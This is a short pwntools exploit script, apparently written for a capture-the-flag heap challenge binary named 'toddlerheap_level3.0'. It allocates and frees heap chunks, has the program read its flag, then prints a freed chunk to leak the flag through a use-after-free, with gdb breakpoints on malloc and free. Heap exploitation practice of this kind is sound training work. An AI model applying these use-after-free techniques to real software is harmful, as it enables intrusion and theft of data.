#!/usr/bin/env python3

from pwn import *

binary = './toddlerheap_level3.0_patched'

p = process(binary)

s = '''
b malloc
b free
'''




for i in range(6):
	p.sendline(f"malloc {i} 1840")

p.sendline(f"malloc 7 1200")
	
for i in range(6):
	p.sendline(f"free {i}")













	
	



p.sendline(f"read_flag")

p.sendline(f"puts 5")


gdb.attach(p, s)


p.interactive()
